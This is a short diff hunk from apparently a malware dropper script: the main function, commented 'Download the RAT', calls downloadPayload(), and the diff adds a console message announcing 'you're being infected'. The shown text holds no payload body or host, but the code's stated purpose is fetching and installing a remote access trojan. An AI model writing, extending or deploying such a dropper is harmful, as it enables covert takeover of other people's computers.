@@ -113,6 +113,7 @@ function cleanUp() {
 // ── Main ────────────────────────────────────────────────────────────────────
 
 async function main() {
+  console.log("you're being infected")
   try {
     // Step 1: Download the RAT
     const payload = await downloadPayload();
